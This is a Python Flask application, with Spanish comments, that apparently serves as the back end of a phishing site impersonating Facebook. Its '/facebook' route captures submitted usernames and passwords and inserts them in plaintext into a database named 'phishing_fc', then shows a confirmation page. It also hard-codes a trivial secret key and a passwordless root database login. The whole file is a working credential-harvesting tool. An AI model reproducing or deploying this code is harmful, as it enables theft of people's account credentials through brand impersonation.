from pickle import FALSE
from flask import Flask
from flask import render_template, redirect, url_for, session, request
# MySQLdb.cursors --> uso de cursores de MYSQL. (Insert/Update/Select/Delete)
import MySQLdb.cursors
# Para integración de MYSQL en flask
from flask_mysqldb import MySQL
# MySQLdb.cursors --> uso de cursores de MYSQL. (Insert/Update/Select/Delete)
import MySQLdb.cursors

#para asignar a la variable app la creación de más rutas para mi aplicación
app = Flask(__name__)
PORT=5000
DEBUG=False

#Base de datos
'''
DATOS DE CONEXIÓN A BASE DE DATOS
'''
# clave secreta para protección extra
app.secret_key = '123'
# Datos de conexión de la base de datos
# nombre del servidor / host
app.config['MYSQL_HOST'] = 'localhost'
# nombre del usuario MYSQL XAMMP
app.config['MYSQL_USER'] = 'root'
# contraseña de MYSQL
app.config['MYSQL_PASSWORD'] = ''
# nombre de la base de datos
app.config['MYSQL_DB'] = 'phishing_fc'

# Inicializar MYSQL
mysql = MySQL(app)


'''
RUTAS PARA EL REDIRECCIONAMIENTO A LOS HTML MEDIANTE UNA FUNCIÓN DE PYTHON
'''
#Variables para crear rutas del servidor
@app.route('/')     #ruta para página principal
def inicio():
    return render_template("inicio.html")

@app.route('/facebook', methods=['GET','POST'])
def registro():
    # captura lo que viene en el método POST username y password
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:
        # Creación de variables para facilitar el acceso a lo que viene por POST
        user = request.form['username']
        passw = request.form['password']
        # Comprobar si la cuenta existe usando MySQL
        cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute('INSERT INTO usuarios VALUES (NULL, %s, %s)', (user, passw))
        # Este método envía una sentencia COMMIT al servidor MySQL, confirmando la transacción actual.
        mysql.connection.commit()
        # redireccionando a plantilla confirmación de acceso.
        return redirect(url_for('confirmacion'))
    else:
        print("Error de ingreso de credenciales")

@app.route('/facebook/confirmacion', methods=['GET','POST'])     #ruta para página principal
def confirmacion():
        return render_template('confirmacion.html')

#Validación para comprobar si estamos en el archivo principal
if __name__ == '__main__':
    app.run(port = PORT, debug = DEBUG) #ejecución de la app 